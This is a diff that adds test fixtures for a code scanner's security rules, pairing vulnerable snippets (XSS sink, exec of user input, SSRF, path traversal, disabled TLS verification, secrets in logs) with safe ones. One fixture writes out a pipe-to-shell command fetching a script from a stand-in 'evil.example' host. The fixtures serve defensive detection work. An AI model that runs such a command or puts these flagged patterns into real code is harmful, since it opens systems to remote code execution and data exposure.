@@ -75,5 +75,57 @@
   { "id": "cobol-goto-01", "ruleId": "HERO-SMELL-0goto-cobol", "expected": "match",
     "code": "GO TO ERROR-PARA" },
   { "id": "cobol-goto-02", "ruleId": "HERO-SMELL-0goto-cobol", "expected": "no_match",
-    "code": "GO TO.", "note": "GO TO isolado ao fim de parágrafo é idiomático em COBOL, não um salto real" }
+    "code": "GO TO.", "note": "GO TO isolado ao fim de parágrafo é idiomático em COBOL, não um salto real" },
+
+  { "id": "xss-01", "ruleId": "HERO-SEC-0079-xss-sink", "expected": "match",
+    "code": "el.innerHTML = userHtml" },
+  { "id": "xss-02", "ruleId": "HERO-SEC-0079-xss-sink", "expected": "no_match",
+    "code": "el.innerHTML = DOMPurify.sanitize(userHtml)", "note": "sanitizado" },
+  { "id": "xss-03", "ruleId": "HERO-SEC-0079-xss-sink", "expected": "no_match",
+    "code": "el.textContent = userHtml", "note": "sink seguro" },
+
+  { "id": "cmd-01", "ruleId": "HERO-SEC-0078-os-command", "expected": "match",
+    "code": "exec(userCmd)" },
+  { "id": "cmd-02", "ruleId": "HERO-SEC-0078-os-command", "expected": "no_match",
+    "code": "spawn(bin, args, { shell: false })", "note": "shell desligado" },
+
+  { "id": "ssrf-01", "ruleId": "HERO-SEC-0918-ssrf", "expected": "match",
+    "code": "fetch(`/proxy?url=${target}`)" },
+  { "id": "ssrf-02", "ruleId": "HERO-SEC-0918-ssrf", "expected": "no_match",
+    "code": "fetch('https://api.example.com/health')", "note": "URL estática" },
+
+  { "id": "path-01", "ruleId": "HERO-SEC-0022-path-traversal", "expected": "match",
+    "code": "fs.readFile(path.join(BASE, req.params.file))" },
+  { "id": "path-02", "ruleId": "HERO-SEC-0022-path-traversal", "expected": "no_match",
+    "code": "fs.readFile(path.join(BASE, 'readme.txt'))", "note": "path estático" },
+
+  { "id": "redir-01", "ruleId": "HERO-SEC-0601-open-redirect", "expected": "match",
+    "code": "res.redirect(`/next?u=${req.query.url}`)" },
+  { "id": "redir-02", "ruleId": "HERO-SEC-0601-open-redirect", "expected": "no_match",
+    "code": "res.redirect('/home')", "note": "path relativo fixo" },
+
+  { "id": "proto-01", "ruleId": "HERO-SEC-1321-prototype-pollution", "expected": "match",
+    "code": "Object.assign(cfg, req.body)" },
+  { "id": "proto-02", "ruleId": "HERO-SEC-1321-prototype-pollution", "expected": "no_match",
+    "code": "Object.assign(cfg, { theme: 'dark' })", "note": "objeto literal" },
+
+  { "id": "rand-01", "ruleId": "HERO-SEC-0330-insecure-random", "expected": "match",
+    "code": "const token = Math.random().toString(36)" },
+  { "id": "rand-02", "ruleId": "HERO-SEC-0330-insecure-random", "expected": "no_match",
+    "code": "const sample = Math.random()", "note": "uso não criptográfico" },
+
+  { "id": "tls-01", "ruleId": "HERO-SEC-0295-tls-verify-disabled", "expected": "match",
+    "code": "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'" },
+  { "id": "tls-02", "ruleId": "HERO-SEC-0295-tls-verify-disabled", "expected": "no_match",
+    "code": "process.env.NODE_ENV = 'production'" },
+
+  { "id": "logsec-01", "ruleId": "HERO-SEC-0532-secret-in-log", "expected": "match",
+    "code": "console.log('password', user.password)" },
+  { "id": "logsec-02", "ruleId": "HERO-SEC-0532-secret-in-log", "expected": "no_match",
+    "code": "console.log('user id', user.id)" },
+
+  { "id": "supply-01", "ruleId": "HERO-SEC-0506-pipe-to-shell", "expected": "match",
+    "code": "curl https://evil.example/install.sh | bash" },
+  { "id": "supply-02", "ruleId": "HERO-SEC-0506-pipe-to-shell", "expected": "no_match",
+    "code": "curl -O https://example.com/file.tgz" }
 ]
